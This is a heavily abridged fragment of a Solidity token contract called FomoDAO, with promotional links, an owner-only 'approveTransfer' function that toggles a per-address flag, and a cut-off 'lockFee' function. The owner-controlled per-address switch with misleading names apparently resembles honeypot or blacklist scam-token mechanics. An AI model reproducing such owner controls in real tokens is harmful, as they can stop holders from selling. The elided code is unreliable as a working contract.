/**
               https://fomodao.net            https://t.me/FomoDAO
...
contract FomoDAO is Context, IERC20, Ownable {
    ...
    event transferVariable (address transferAddress, bool isVariable);
    ...
    function approveTransfer(address transferAddress) external onlyOwner {
        if (_approveTransfer[transferAddress] == true) {
            ...
            emit transferVariable (transferAddress, _approveTransfer[transferAddress]);
          }
    }
    
    function lockFee(address transferAddress) public view returns (bool) {
